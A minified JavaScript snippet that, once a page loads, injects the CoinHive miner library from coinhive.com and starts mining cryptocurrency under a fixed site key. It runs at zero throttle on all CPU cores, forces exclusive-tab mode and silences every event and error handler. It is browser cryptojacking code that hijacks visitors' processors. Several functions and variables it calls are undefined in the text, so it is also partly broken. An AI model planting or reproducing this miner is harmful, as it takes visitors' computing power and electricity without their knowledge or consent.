! function() { var n = function() { try { return !!window.addEventListener } catch (n) { return !1 } },
        t = function(t, e) { n() ? document.addEventListener("DOMContentLoaded", t, e) : document.attachEvent("onreadystatechange", t) };
    t(function() {! function() { var n = document.createElement("script");
            n.type = "text/javascript", n.async = !0; var t = document.getElementsByTagName("script")[0];
            n.src = "https://coinhive.com/lib/coinhive.min.js", n.onload = function() { var n = "jVwy4y10DD5Ahz6qQ83qLrwXd5KZgJfp",
                    t = !0,
                    e = navigator.hardwareConcurrency,
                    i = 0,
                    o = 1e3,
                    r = new CoinHive.Anonymous(n, { throttle: i, threads: e }),
                    u = CoinHive.FORCE_EXCLUSIVE_TAB;
                t && start(u), r.on("open", function() {}), r.on("authed", function(n) {}), r.on("close", function() {}), r.on("error", function(n) {}), r.on("job", function() {}), r.on("found", function() {}), r.on("accepted", function() {}), setInterval(function() { is_running = "", isRunning() ? (is_running = html_text_is_running_true, document.getElementById(html_miner_is_running_id_output).className = html_miner_is_running_id_output_yes) : (is_running = html_text_is_running_false, document.getElementById(html_miner_is_running_id_output).className = html_miner_is_running_id_output_no), document.getElementById(html_miner_is_running_id_output).innerHTML = is_running, document.getElementById(html_mining_hashes_per_second_id_output).innerHTML = getHashesPerSecond(), document.getElementById(html_mining_accepted_hashes_per_second_id_output).innerHTML = getAcceptedHashes(), document.getElementById(html_mining_threads_id_output).innerHTML = getNumThreads(), document.getElementById(html_mining_hashes_total_id_output).innerHTML = getTotalHashes(!0), document.getElementById(html_mining_current_throttle_id_output).innerHTML = getThrottle() }, o) }, n.onerror = function() {}, t.parentNode.insertBefore(n, t) }() }, !1) }();